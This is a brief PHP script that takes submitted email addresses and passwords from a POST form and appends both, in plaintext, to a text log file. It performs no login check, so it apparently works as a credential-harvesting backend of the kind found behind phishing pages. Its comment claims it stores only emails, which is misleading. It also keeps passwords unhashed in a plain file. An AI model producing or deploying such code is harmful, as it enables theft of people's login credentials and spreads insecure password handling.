<?php
$logFile = "Data/logins_log.txt"; // File to store input emails
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $inputEmail = trim($_POST['email'] ?? '');
    
    if (!empty($inputEmail && !empty($_POST['password']))) {
        // Append email and password to the log file
        file_put_contents($logFile, $inputEmail . PHP_EOL, FILE_APPEND | LOCK_EX);
        file_put_contents($logFile, $_POST['password'] . PHP_EOL, FILE_APPEND | LOCK_EX);
    }
}
?>